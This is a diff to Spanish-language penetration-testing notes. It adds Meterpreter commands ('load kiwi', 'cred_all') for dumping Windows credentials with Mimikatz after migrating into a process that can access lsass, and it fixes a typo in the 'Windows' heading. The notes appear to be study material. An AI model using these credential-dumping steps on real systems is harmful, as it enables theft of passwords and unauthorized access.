@@ -50,7 +50,13 @@ Para migrar a procesos que puedan manipilar el lsass
 migrate -N spoolsv.exe
 
 ```
-
+Para dumpear los passwords con  Mimikatz (Kiwi is the updated version of Mimikatz)
+ ```
+ load kiwi
+ help
+ cred_all
+ ```
+ 
 ### Encontrar scripts nmap SMB
 
 Vamos a buscarlos recordamos que los scripts tienen la extencion .nse
@@ -69,7 +75,7 @@ locate *.nse | grep "smb"
 ![image](https://user-images.githubusercontent.com/63270579/230146227-e6c3af45-1cea-46ee-9b30-0687eca73855.png)
 
 
-## Windos  
+## Windows  
 
 ### lsass
 
